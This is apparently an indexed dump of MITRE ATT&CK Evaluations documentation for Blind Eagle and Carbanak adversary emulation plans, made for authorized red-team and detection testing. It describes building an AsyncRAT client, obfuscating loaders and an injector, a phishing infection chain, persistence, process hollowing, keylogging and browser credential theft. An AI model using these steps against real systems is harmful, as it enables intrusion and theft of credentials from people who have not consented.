CTI","p":["https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia","https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/","https://dciber.org/analisando-asyncrat-distribuido-na-colombia/","https://dciber.org/apt-c-36-ataques-continuos-direcionados-a-instituicoes-e-corporacoes-do-governo-colombiano/","https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/","https://blog.scilabs.mx/en/campaign-attributed-to-apt-c-36-context-and-iocs/"]}],[{"l":"AsyncRAT Client"},{"l":"Overview","p":["AsyncRATs client is written in C# and communicates with the C2 server over an encrypted TCP session. The server generates a certificate when first started and the client uses that certificate to validate that it is connected to the correct server. The client implements sevaral capabilities outlined below with CTI references:","Capability","Description","CTI / References","Anti-Analysis","Anti Analysis techniques to determine if the program is running in a sandbox or debugging environment","2","Persistence","Persistence via either Startup/Registry or Scheduled Tasks depending on the integrity of the AsyncRAT process","1, 2","Critical Process","If AsyncRAT detects it is running as Administrator it will also set itself as a critical process with RtlSetProcessIsCritical- which according to pinvoke.net is an undocumented DLL that can set a process to cause a Blue Screen of Death (BSOD) on kill","3"]},{"l":"Usage","p":["After starting the AsyncRAT server right click in the window -> select BUILDER from the menu.","Builder from Menu","Set Connection and Install properties accordingly","client-connection","client-install","select the Build tab and click Build","client-build","name the client file","client-name","Once the file is generated it will need to be encoded properly using file-ops.py as follows:","Windows:","Linux/Mac:","This will save a file called asy.txt to the current working directory."]},{"l":"Troubleshooting","p":["Coming soon"]},{"l":"Build","p":["The client portion is built with the project - and implants are created from the C2 GUI"]},{"l":"References and CTI","p":["https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia","https://dciber.org/analisando-asyncrat-distribuido-na-colombia/","http://www.pinvoke.net/default.aspx/ntdll/RtlSetProcessIsCritical.html?diff=y"]}],[{"l":"AsyncRAT Plugins"},{"l":"Overview","p":["AsyncRAT implements plugins to expand capability. Plugins are built on the Server side and only sent to the client when they need to be executed. For the purposes of this emulation the following Plugins are leveraged:","Plugin","Description","CTI/Reference","LimeLogger","LimeLogger is a keylogging utility leveraged by AsyncRAT as a plugin","1","Recovery","Recovery has functionality to steal cookies and passwords from the password managers of various browsers. As of writing Chromium based and FireFox browsers are supported.","1, 2"]},{"l":"Usage","p":["Plugins are typically ran from the GUI menu. Both the Keylogger and Recovery can be found under Monitoring in the context menu by right clicking in the GUI:","plugins","Upon selection the plugin will be sent to the client (first time) or ran from the client (already used once) and output will show up under Logs"]},{"i":"ctireferences","l":"CTI/References","p":["https://dciber.org/apt-c-36-ataques-continuos-direcionados-a-instituicoes-e-corporacoes-do-governo-colombiano/","https://dciber.org/analisando-asyncrat-distribuido-na-colombia/"]}],[{"l":"AsyncRAT Server"},{"l":"Overview","p":["The AsyncRAT server is a Windows .NET GUI application that manages AsyncRAT clients by issuing tasks and receiving output 1."]},{"l":"Usage","p":["After build double clicking the AsyncRAT icon located in AsyncRAT-C#\\Binaries\\Release will launch the server GUI:","server-icon","On first launch AsyncRAT server will create a certificate used for communication via SSL. The name can be changed or left at default:","server-cert","Once the certificate has been generated the next screen allows the user to select which TCP ports the server will listen on:","server-ports","Clicking Start then launches the server and the user is presented with the management GUI. The user has the option to view Clients, Logs, Thumbnails, and Tasks from the GUI:","gui","Right clicking within the GUI brings up the Context menu where clients can be built or tasked:","menu"]},{"l":"Build","p":["Build is addressed at the top level of the project."]},{"l":"References","p":["https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp"]}],[{"l":"Loaders"},{"l":"Overview","p":["The Loaders folder contains the following resources that enable the emulation of APT-C-36 Blind Eagle. Along with instructions, their respective TTPs and CTI references:","Payload","Description","VBS Loader","loader written in VBS hidden in Microsoft WinRM file","fiber.dll","DLL written in C# that handles downloading and executing the injector and payload","fsociety.dll","DLL written in C# that performs process hollowing 1 to inject AsyncRAT into RegSvcs.exe","file-ops.py","Python script to aid in performing obfuscation of URLs and payloads"]},{"l":"Dependencies","p":["This emulation has a few dependencies that, without proper configuration, will cause the emulation to fail. The following table shows components and their dependent input and output:","Component","Input Dependency/s","Output Dependency","VB Loader","obfuscated URL pointing to AsyncRAT Client (asy.txt) created with file-ops.py-u flag","double extension added .pdf.vbs then winRAR archived as .pdf.uue","fiber.dll","hard coded reversed URL pointing to Rump.xls(Fsociety.dll) in fiber.cs","file-ops.py obfuscation using the -b flag","Fsociety.dll","N/A","file-ops.py obfuscation using the -f flag","AsyncRAT Client","file-ops.py obfuscation using the -r flag"]},{"l":"References","p":["https://attack.mitre.org/techniques/T1055/012"]}],[{"l":"Fiber DLL"},{"l":"Overview","p":["Fiber is a second stage loader that Blind Eagle has used in operations 1, 2. Fiber has three functions that it performs:","Copies the VBS loader to C:\\Windows\\Temp and renames it OneDrive.vbs","Downloads and executes the injector fsociety.dll","Establishes userland persistence by creating an lnk file in the users Startup folder posing as notepad.exe","The VAI method of fiber.dll takes one argument, a URL. The URL is typically passed in obfuscated form from the first stage loader to fiber.dll. fiber.dll will unreverse the URL and replace junk characters with ones to form a proper URL. On the other end of the URL is the AsyncRAT payload (asy.txt)."]},{"l":"Usage","p":["fiber.dll first needs to be encoded in base64. file-ops.py has a function for this and can be used as follows:","Windows:","Linux/Mac:","The URL on line 55 will also need to be updated prior to build with the IP address of the attacker server:"]},{"l":"Build","p":["Two build options are presented. The CLI can be used with devenv.exe to build the fiber.sln solution. Also instructions for the Visual Studio GUI are also included:"]},{"l":"CLI"},{"l":"GUI","p":["Open Solution in Visual Studio - this option is presented upon Visual Studio opening","open","fiber-sln","In the menu bar near the top of the window, change the dropdown from Debug to Release - this will build and remove any debugging assistance from the project:","debug->release","In the menu bar at the top of the window, select Build -> Build Solution. The completed executables will be located in birdsofprey\\Resources\\fiber\\bin\\Release","build"]},{"l":"Cleanup","p":["delete OneDrive.vbs from C:\\Windows\\Temp","delete notepad.lnk from %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"]},{"l":"References and CTI","p":["https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia","https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/"]}],[{"l":"fsociety DLL"},{"l":"Overview","p":["fsociety DLL is an injector that Blind Eagle has used in operations 1, 2. fsociety is a single program written in C# that leverages process hollowing to inject a payload into another program - usually RegSvcs.exe or RegAsm.exe. The original source code has been rewritten in a de-obfuscated fasion for readability 3. The de-obfuscated code shares many similarities with the Lime-Crypter implementation of RunPE, however the threat actor has added some wrappers for windows APIs in addition to importing them."]},{"l":"Usage","p":["fsociety is downloaded and ran by fiber.dll as part of the infection chain. prior to running, fsociety.dll is manipulated by the threat actor to be base64 encoded, have all A s replaced with a Unicode string, and then reversed. The utility file-ops.py has been created in the Util folder to assist in replicating the obfuscation of the binary for delivery.","Windows:","Linux/Mac:"]},{"l":"Troubleshooting","p":["Sometimes injection does not work on the first try and an implant will not succeed. If this happens verify that the target path exists: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.3819\\RegSvcs.exe and that the PE being injected is set up in the proper format with file-ops.py"]},{"l":"Testing","p":["To verify that fsociety.dll is injecting properly it can be tested from a PowerShell prompt with either an AsyncRAT payload OR another payload of your choosing. To do this first follow the instructions in AsyncRAT README to build the server and create a client with instructions in AsyncRAT Client README.","Once the server is running you can use the following PowerShell to test fsociety.dll filling in the paths with ones specific to your system:","If successful you should receive a callback from the AsyncRAT client on the server and when hovering the mouse over the client see that the Path values is C:\\Windows\\Microsoft.NET\\Framwork\\v4.0.3819\\RegSvcs.exe indicating that AsyncClient is living in the legitimate RegSvcs.exe process:","injected-client","Likewise a tool such as Process Hacker will show the AsyncClient assembly loaded into RegSvcs.exe with the path showing the path to RegSvcs.exe:","Process-Hacker-injected-client","Likewise if you look at the modules and method tables associated with the legitimate RegSvcs.exe and the injected RegSvcs.exe you can spot many differences - including the Image Size and Resource Tables information. The method tables are completely different for the injected RegSvcs.exe vs the legitimate version","Normal RegSvcs.exe modules","normal","Injected RegSvcs.exe modules","injected","Normal RegSvcs.exe Method Table","Injected RegSvcs.exe Method Table"]},{"l":"Build","p":["Two build options are presented. The CLI can be used with devenv.exe to build the fsociety.sln solution. Also instructions for the Visual Studio GUI are also included:"]},{"l":"CLI"},{"l":"GUI","p":["Open Solution in Visual Studio - this option is presented upon Visual Studio opening","open","asyncrat-sln","In the menu bar near the top of the window, change the dropdown from Debug to Release - this will build and remove any debugging assistance from the project:","debug->release","In the menu bar at the top of the window, select Build -> Build Solution. The completed executables will be located in birdsofprey\\Resources\\Efsociety\\bin\\Release","build"]},{"l":"References and CTI","p":["https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia","https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/","https://otx.alienvault.com/indicator/file/03b7d19202f596fe4dc556b7da818f0f76195912e29d728b14863dda7b91d9b5"]}],[{"l":"VBS Loader"},{"l":"Overview","p":["Blind Eagle is known to use VBS loaders as a second stage or later loader of malware infection 1, 2, 3, 4, 5. The loader for this scenario is based on a variant used in more recent campaigns. The VBS loader is hidden inside of a seemingly legitimate winRM vbs script. The purpose of this loader is to downlod and execute the second stage DLL, and is typically also targeted for persistence by the second stage DLL loader."]},{"l":"Usage","p":["The loader should be populated with the correct URL for the final payload on line 344. The file-ops.py script has a function to encode the URL properly.","Typically the vbs file will be named according to the current campaigns pretext and use a double extension such as pdf.vbs 2. In some instances the payload will also be compressed into a .uue file or another type of zip/compressed file 1, 2. Simply double clicking the file will set off execution.","To execute via CLI:"]},{"l":"Troubleshooting","p":["the VB loader can have issues running the PowerShell script due to the Unicode characters. Ensuring that the VB loader is saved with UTF-16LE encoding will allow PowerShell to run and parse the Unicode URL on line 344 properly.","To save the file as UTF16-LE You can use Visual Studio Code - in the lower right corner of the window the encoding should be listed:","encoding","If VSCode shows a different value you can click the encoding and choose \"Save With Encoding\" from the action menu:","save-with-encoding"]},{"l":"Build","p":["Run file-ops.py with the -u flag to generate a URL pointing to asy.txt(asyncrat payload) on your remote host. This will save a file called url.txt in the current folder","Open url.txt in VSCode and copy string into line 344 between the single quotes just after UUkXaLU = e').G44ââ@4ï¿½tM44ââ@4ï¿½thod('VAI').Invok44ââ@4ï¿½($null, [obj44ââ@4ï¿½ct[]] ('"]},{"l":"References and CTI","p":["https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/","https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia","https://dciber.org/apt-c-36-ataques-continuos-direcionados-a-instituicoes-e-corporacoes-do-governo-colombiano/","https://blog.scilabs.mx/en/campaign-attributed-to-apt-c-36-context-and-iocs/","https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/"]}],[{"l":"Blind Eagle Emulation Binaries","p":["This folder consists of the following archives and files:","File","Description","Binaries.zip","Contains pre-compiled and obfuscated files for the Blind Eagle emulation and precompiled AsyncRAT Server","django-cms-quickstart.zip","Contains pre-built website for bancomurcielago","index.html","hidden iFrame to be hosted for phishing callback","Notificacion De Pago.pdf","Phishing PDF with link to VBS Loader"]}],[{"l":"File ops Utility"},{"l":"Overview","p":["The file ops utility is a small Python script that assists in encoding URLs and files used in the emulation of Blind Eagles attack chain. It has three main functions pertinent to this emulation:","The URL function takes in a URL and replaces characters in the string with Unicode replacements. The function also reverses the string before writing it to a file called url.txt. The content of this file will be used in the VBS loader and passed as an argument to the VAI method of fiber.dll.","The process_fsociety_file function takes in the path to fsociety.dll. The function will encode the file in Base64, replace the letter A with a unicode string, and return the string reversed. Then the payload is written to a file called Rump.xls. This file is downloaded from a Discord CDN as part of the infection chain.","The process_asyncrat_file function takes in the path to an AsyncRAT client executable. The function will then encode the file in Base64 and return the string reversed. The string is then written to a file called asy.txt. This file is also downloaded from a Discord CDN as part of the infection chain."]},{"l":"Usage"}],[{"l":"Scenario Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by Blind Eagle.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating Blind Eagle to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and act on objectives on a single server."]},{"l":"Network Diagram","p":["Below are the domains and infrastructure used to support the setup and execution of the Blind Eagle Emulation plan.","Infra"]},{"l":"Emulation Team Infrastructure","p":["This emulation leveraged the following attacker infrastructure with configurations.","Red Team System","IP Address","OS","Windows Attack Platform","192.168.0.4","Windows 10 Pro - Build 19044","Web Server","192.168.0.5","Ubuntu 20.04 LTS"]},{"l":"A note about payloads","p":["This evaluation utilizes payloads that model malware previously used by Blind Eagle.","These utilities include loaders, injectors, and implants.","The Binaries.zip contains all executables in one zip file for easy download. The password is malware.","Implants are configured to connect back to static IP address 192.168.0.4. Build instructions for each payload can be found with source code in their respective directories."]},{"i":"windows-attack-platform-setup--19216804","l":"Windows Attack Platform Setup \\ 192.168.0.4","p":["RDP to your Windows Attack Platform","Open Windows Defender and toggle all of the knobs to the off position - this is so that Defender will not eat your malware","defender-off","Open a PowerShell Prompt and download the Blind Eagle ATTACK Evaluations Library to your chosen directory on your Windows attack machine","Open File Explorer and navigate to the repo directory Resources\\Binaries\\. Right click - Extract Files on Binaries.zip and provide the password malware when prompted"]},{"i":"web-server-setup--19216805","l":"Web Server Setup \\ 192.168.0.5","p":["SSH to the web server from either your machine or a separate PowerShell prompt on your Windows Attack Platform:","Download the Blind Eagle ATTACK Evaluations Library to the /opt folder on your Linux Web Machine","cd to /opt/blackhat-2023-becoming-a-dark-knight-emulation and use unzip -P malware Resources/Binaries/Binaries.zip to extract payloads","Create a the following directories to host payloads from the attack users home directory:","Use the Shell commands below to populate the binaries in the expected directories for the scenario:","SCP the bancomurcielago website built using Django CMS to the victim Web server â this will be used in a later configuration step"]},{"l":"Target Infrastructure","p":["10.1.0.10","10.1.0.11","10.1.0.4","10.1.0.7","4 targets, all domain joined to the bancomurcielago domain:","bancomurcielago-linux-srv3","canario","desk1","Domain Controller","Exchange Admin Workstation","Exchange Server","Hostname","IP Address","mail","OS","Target System","Ubuntu 20.04 LTS","webserver","Windows 10 Pro - Build 19043","Windows Server 2019 - Build 17763"]},{"i":"configure-domain-controller-canario-101010","l":"Configure Domain Controller canario\\ 10.1.0.10","p":["Note: in the scenario, DNS records were manually created to emulate network activity from suspect domains If you wish to create DNS records the following will be useful for a complete emulation:","IP Address","DNS Name","192.168.0.5","dian-info.com","10.1.0.4","web.bancomurcielago.com","Create the user accounts as used in the scenario:","username","groups","demo_admin","Domain Users","devadmin","EWS Admins, Domain Admins, Domain Users"]},{"i":"configure-workstation-desk1-10107","l":"Configure Workstation desk1\\ 10.1.0.7","p":["RDP to the workstation from either your computer or the Windows Attack Machine:","Open Windows Defender, toggle all nobs to the off position - this is so that the malware can execute properly to completion If it is is useful to your organization to test defenses against this adversary you may choose to do this differently, however some tradecraft is likely to be blocked by modern EDR solutions (we hope)","defender-off"]},{"i":"configure-ews-server-mail-101011","l":"Configure EWS Server mail\\ 10.1.0.11","p":["SSH to mail from either your computer or the Windows Attack Machine:","Setup Exchange Server to host OWA and EAC.","Create the \"EWS Admins\" group, adding devadmin"]},{"i":"configure-web-server-bancomurcielago-linux-srv3-10104","l":"Configure Web Server bancomurcielago-linux-srv3\\ 10.1.0.4","p":["Remove any prior Docker and Docker-Compose installations:","Install prerequisite packages:","Set up Docker APT repo:","Install Docker and Docker Compose:","unzip website built with Django CMS in /opt/ on bancomurcielago-linux-srv3","Run the website with Docker:","The bancomurcielago website should now be hosted on HTTP port 8000"]},{"l":"Resources","p":["The Binaries.zip contains all executables in one zip file for easy download. The password is malware. â binaries in this folder will only work with the infrastructure configuration described in this document as some payloads need to be built with specific URLs hard coded."]}],[{"l":"Blind Eagle Intelligence Summary"},{"l":"Adversary Overview","p":["Blind Eagle, a.k.a. APT-C-36, Ãguila Ciega (ATT&CK Group ID: G0099), is a Spanish-speaking threat actor that has been active since at least 2018. 1 The group is believed to be based in South America, given their use of regional Spanish dialects and intimate knowledge of government agencies and other local institutions in the region. The group tends to target Colombia-based institutions, including entities in the financial, manufacturing, and petroleum sectors. 2 However, this threat actor has also executed operations against victims throughout South America, Europe, the US, and Australia. 3 4 While Blind Eagle tends to be largely opportunistic in their motives, though they have conducted espionage operations as well. 5","Blind Eagle generally relies on commodity RATs, including Imminent Monitor, BitRAT, QuasarRAT, AsyncRAT, LimeRAT, and RemcosRAT. 6 7 8 This threat actor's campaigns often leverage spearphishing for initial access and the deployment of encrypted payloads. 2 Additional common TTPs used by this threat actor include: spearphishing, use of malicious macros, process injection, and other LOTL techniques. 5 9 The group also employs relatively strict targeting, and has been known to link-shortening services that geoloate victims. 3"]},{"l":"Group Overview Report References","p":["1","2","3","4","5","6","7","8","9","https://attack.mitre.org/groups/G0099/","https://blog.scilabs.mx/malware-campaign-attributed-to-apt-c-36-context-and-iocs-update-june-2022/","https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia","https://lab52.io/blog/apt-c-36-recent-activity-analysis/","https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/","https://web.archive.org/web/20190625182633/https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/","https://webcache.googleusercontent.com/search?q=cache:DTTI-wdD7KcJ:blog.la.trendmicro.com/proyecto-rat-una-campana-de-spam-dirigida-a-entidades-colombianas-a-traves-del-servicio-de-correo-electronico-yopmail/cd=10hl=enct=clnkgl=us","https://www.ecucert.gob.ec/wp-content/uploads/2022/03/alerta-APTs-2022-03-23.pdf","https://www.trendmicro.com/en_us/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html","ID","Report Links"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8ï¸","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]}],[{"i":"#","p":["This emulation was created for the 2023 BlackHat presentation \uD83C\uDFA9 , Becoming a Dark Knight: Adversary Emulation Demonstration for ATT&CK Evaluations. This presentation focused how to combine CTI and red development team capabilities for adversary emulation.","The ATT&CK Evaluation team created the below scenario leveraging techniques seen from Blind Eagle in the wild based on open-source reporting. We have adapted the scenario based on tools and resources available at the time. This emulation was researched, developed, and presented with one Windows SME Red Team developer, one CTI Analyst, and one Technical lead in 2 months while working on other work 50% of their time. Our goal was to provide a simpler emulation example when faced with limited resources. Therefore, this emulation is less complicated than other emulations represented in the ATTACK Evaluations Library.","This page contains a high-level overview of our Blind Eagle scenario and related diagram, as well as the full 5-step plan created by our CTI analyst."]},{"i":"emulation-scenario","l":"Emulation Scenario \uD83D\uDCD6","p":["This scenario follows Blind Eagle's cyberattack against a Colombian target. Blind Eagle will gain initial access via user execution of a link in a file sent via spearphishing. Once execution is obtained and persistence installed, Blind Eagle downloads and executes the AsyncRAT for additional actions on objective. Characteristics of this campaign include social engineering, open-source modified RATs, exploitation of a single workstation, and theft of browser credentials.","Software Flow Diagram"]},{"i":"scenario-steps","l":"Scenario Steps\uD83D\uDC63","p":["AsyncRAT","AsyncRAT Edge browser","AsyncRAT Powershell Visual Basic RegSvcs.exe Fsociety.dll fiber.dll","AsyncRAT PowerShell Visual Basic WinRAR","BlackBerry - Feb 2023 Check Point Research - Jan 2023 Lab 52 - 2020 TrendMicro - Sept 2021 SCILabs MX - Jul 2022 ThreatMon - Apr 2023 Lab 52 - Mar 2023","BlackBerry - Feb 2023 Check Point Research - Jan 2023 QiAnXin Threat Intelligence Center - Feb 2019 Lab 52 - 2020 TrendMicro - Sept 2021 SCILabs MX - June 2022","BlackBerry - Feb 2023 DCiber - Jun 2022 Lab 52 - Mar 2023 EcuCERT - 2022 GitHub - AsyncRAT","BlackBerry - Feb 2023 Lab 52 - 2020 SCILabs MX - Jul 2022 Lab 52 - Mar 2023 GitHub - AsyncRAT","BlackBerry - Feb 2023 ThreatMon - Apr 2023 DCiber - Jun 2022 SCILabs MX - Jul 2022 GitHub - AsyncRAT Secure Soft - Apr 2023","Blind Eagle gains an initial foothold into the victimâs system via spearphishing ( T1566.001). The attackers send an email containing a password-protected PDF, and the password is provided in the emailâs content. The sender address spoofs the Colombian National Directorate of Taxes and Customs (DIAN), a legitimate Colombian government agency.","Blind Eagle will then utilize AsyncRAT to conduct keylogging and steal information from the victimâs web browser ( T1056.001). Specifically, the malware will be used to steal browser credentials ( T1555.003). Finally, the attackers will navigate to the victim's online banking portal and use the previously keylogged credentials to gain admin access to the site ( T1056.001).","Browser-based Outlook instance Adobe Acrobat","GitHub - AsyncRAT DCiber - Jun 2022 QiAnXin Threat Intelligence Center - Feb 2019 DCiber - Mar 2023 Check Point Research - Jan 2023 SCILabs MX - Jul 2022","Next, Blind Eagle will look to establish persistence on the host device. Given that the user is non-admin, the attackers use fiber.dll to leverage Windows Script Host to copy the VBS loader to Windows Temp folder ( T1570). The attackers also use fiber.dll to create a .lnk file in the user's startup folder ( T1547.001, T1059.003).","Once the AsyncRAT payload is decrypted ( T1132.001, T1140), it shows that the C2 infrastructure is hosted on a site using Duck DNS services and leverages communications over port 1523 ( T1568, T1571). The payload will communicate with the C2 via RSA (SHA512) ( T1573.002).","Once the user manually executes the VBScript, a series of automatic actions will occur. Specifically, the VBScript will use Powershell to download fiber.dll, which is encoded via Base64 ( T1059.001, T1132.001). The fiber.dll will run the VAI method with an obfuscated URL that resolves to a file named \"asy.txt,\" which is the AsyncRAT obfuscated payload ([T1132.001, T1027). Next, fiber.dll will download fsociety.dll (disguised under filename \"Rump.xls\"), which is again encoded via Base64 (T1132.001), T1036.008). Next, the adversary will use fiber.dll and PowerShell (T1059.001) to deobfuscate the URL that resolves to the .txt file, and then downloads and executes the decoded Fsociety.dll (T1140). AsyncRAT will masquerade as the legitimate RegSvcs.exe process via process hollowing (T1055.012, T1218.009).","Reporting","Software","Step 0 - Initial Compromise","Step 1 - Execution","Step 2 - Infection","Step 3 - Command and Control","Step 4 - Establish Persistence & Privilege Escalation","Step 5 - Credential Access","Steps","The non-admin user will enter the password to open the PDF, which contains a fake notification from DIAN regarding outstanding tax payments owed by the user. The document prompts the user to click a link ( T1566.002, T1204.001). This link will download a second item, which is a password protected RAR archive - \"factura-228447578537.pdf.uue\" - that utilizes double file extensions (masquerades as a PDF but really is a UUE) ( T1036.007). The site will download the AsyncRAT payload from a Discord CDN ( T1102). The user will double click the file, which prompts the execution of VBS script (\"factura-22844758537.pdf.vbs\") via wscript.exe and trigger the persistence mechanism ( T1204.002, T1059.005).","User Story"]}],[{"l":"Carbanak","p":["This adversary emulation plan is derived from the original Carbanak content developed and used in the 2020 ATT&CK Evaluations. This emulation plan has not been tested with CALDERA's Emu plugin and interoperability is not guaranteed.","Carbanak is a threat group that has been found to target banks. It also refers to malware of the same name (Carbanak). It is sometimes referred to as FIN7, but these appear to be two groups using the same Carbanak malware and are therefore tracked separately. 1 2 3 4","The Intelligence Summary summarizes 19 publicly available sources as well as the results of an open call for contributions, to describe Carbanak, their motivations, objectives, and observed target industries. It further describes a representative Carbanak Operational Flow along with their publicly attributed Tactics, Techniques, and Procedures (TTPs) mapped to ATT&CK.","The Operations Flow chains techniques together into a logical order that commonly occurs across Carbanak operations. This Carbanak emulation plan features two distinct scenarios described below.","Please note that the FIN7 portion of this plan contains two additional scenarios used during the 2020 ATT&CK Evaluations and can also be found within the CTID ATTACK Evaluations Library.","Scenario 1: This scenario begins with a legitimate user executing a malicious payload delivered via spearphishing attacks targeting financial institutions. Following initial compromise, Carbanak expands access to other hosts through privilege escalation, credential access, and lateral movement with the goal of compromising money processing services, automated teller machines, and financial accounts. As Carbanak compromises potentially valuable targets, they establish persistence so that they can learn the financial organization's internal procedures and technology. Using this information, Carbanak transfers funds to bank accounts under their control, completing their mission.","Scenario 2: This scenario emulates the same Carbanak TTP's as scenario 1; however, changes were made to support environments with protective security controls enabled. This scenario is designed so that specific TTP's are decoupled from dependencies to enable all steps to be executed, even if previous steps are blocked.","The Carbanak emulation plan is a human-readable, step-by-step / command-by-command implementation of Carbanak TTPs. Structurally, the plan is organized into an infrastructure section, and two scenarios, as defined in the Operations Flow. The infrastructure section explains how to prepare the environment to execute both scenarios. The human-readable plan is accompanied by a machine-readable plan implemented in YAML. The YAML includes select steps, commands, and syntax for the Carbanak detections scenario. Please note that the YAML file is not a 1-to-1 replication of the human-readable plan as the ATT&CK Evaluations Carbanak scenario was created before the CTID Emulation Library format was created."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:"]},{"l":"YARA Rules","p":["YARA rules are provided to assist the community in researching, preventing, and detecting malware specimens used in this emulation plan."]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Microsoft","Special thanks to the following projects for providing tools and source code that were used in this emulation:","Metasploit Framework","Impacket","Putty Tools","Microsoft Sysinternals","TinyMet","PowerSploit","SharpWeb","killswitch-GUI","Mimikatz"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2021 MITRE Engenuity. Approved for Public Release. Document number AT0016","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at:","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Carbanak Adversary Emulation","p":["This adversary emulation plan is derived from the original Carbanak content developed and used in the 2020 ATT&CK Evaluations.","Carbanak is a threat group that has been found to target banks. It also refers to malware of the same name (Carbanak). It is sometimes referred to as FIN7, but these appear to be two groups using the same Carbanak malware and are therefore tracked separately. 1 2 3 4","The Intelligence Summary summarizes 19 publicly available sources as well as the results of an open call for contributions, to describe Carbanak, their motivations, objectives, and observed target industries. It further describes a representative Carbanak Operational Flow along with their publicly attributed Tactics, Techniques, and Procedures (TTPs) mapped to ATT&CK.","The Operations Flow chains techniques together into a logical order that commonly occurs across Carbanak operations. This Carbanak emulation plan features two distinct scenarios described below.","Please note that the FIN7 portion of this plan contains two additional scenarios used during the 2020 ATT&CK Evaluations and can also be found within the CTID ATTACK Evaluations Library.","Scenario 1: This scenario begins with a legitimate user executing a malicious payload delivered via spearphishing attacks targeting financial institutions. Following initial compromise, Carbanak expands access to other hosts through privilege escalation, credential access, and lateral movement with the goal of compromising money processing services, automated teller machines, and financial accounts. As Carbanak compromises potentially valuable targets, they establish persistence so that they can learn the financial organization's internal procedures and technology. Using this information, Carbanak transfers funds to bank accounts under their control, completing their mission.","Scenario 2: This scenario emulates the same Carbanak TTP's as scenario 1; however, changes were made to support environments with protective security controls enabled. This scenario is designed so that specific TTP's are decoupled from dependencies to enable all steps to be executed, even if previous steps are blocked.","The Carbanak emulation plan is a human-readable, step-by-step / command-by-command implementation of Carbanak TTPs. Structurally, the plan is organized into an infrastructure section, and two scenarios, as defined in the Operations Flow. The infrastructure section explains how to prepare the environment to execute both scenarios. The human-readable plan is accompanied by a machine-readable plan implemented in YAML. The YAML includes select steps, commands, and syntax for the Carbanak detections scenario. Please note that the YAML file is not a 1-to-1 replication of the human-readable plan as the ATT&CK Evaluations Carbanak scenario was created before the CTID Emulation Library format was created."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:"]},{"l":"Acknowledgements","p":["We would like to formally thank the people that contributed to the content, review, and format of this document. This includes the MITRE ATT&CK and MITRE ATT&CK Evaluations teams, the organizations and people that provided public intelligence and resources, as well as the following organizations that participated in the community cyber threat intelligence contribution process:","Microsoft","Special thanks to the following projects for providing tools and source code that were used in this emulation:","Metasploit Framework","Impacket","Putty Tools","Microsoft Sysinternals","TinyMet","PowerSploit","SharpWeb","killswitch-GUI","Mimikatz"]},{"i":"liability--responsible-usage","l":"Liability / Responsible Usage","p":["This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research."]},{"l":"Notice","p":["Â© 2021 MITRE Engenuity. Approved for Public Release. Document number AT0016","Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at:","http://www.apache.org/licenses/LICENSE-2.0","Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.","This project makes use of ATT&CKÂ®","ATT&CK Terms of Use"]}],[{"l":"Scenario 1"},{"l":"Preface","p":["For the purpose of this emulation plan, Carbanak operations have been separated into 2 scenarios (detections and protections), with steps and granular procedures contained within each. This division enables users to separately test detection and protection capabilities of their defenses. Within each scenario, operations have been broken into specific objectives, which are presented linearly.","While in Scenario 1 each objective enables subsequent objectives, Scenario 2 is designed such that each objective is run independently of any other. Specifically, this scenario is intended to be used in an environment that does not have protective/preventative defense measures enabled, so as to assess detection capabilities. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources. The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives.","This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against 